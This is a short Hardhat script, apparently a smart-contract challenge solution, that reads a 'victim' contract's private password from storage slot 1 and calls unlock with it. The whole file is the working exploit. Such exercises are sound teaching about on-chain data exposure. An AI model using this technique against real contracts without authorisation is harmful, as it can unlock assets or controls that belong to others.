import { ethers } from "hardhat";

const helper = async (victim: any) => {
  // The password is a single byte32 that is the second variable <32 bytes in the contract.
  // Therefore, it's stored at slot 1
  const slot = 1;
  const byteData = await ethers.provider.getStorageAt(victim.address, slot);
  await victim.unlock(byteData);
};

export default helper;
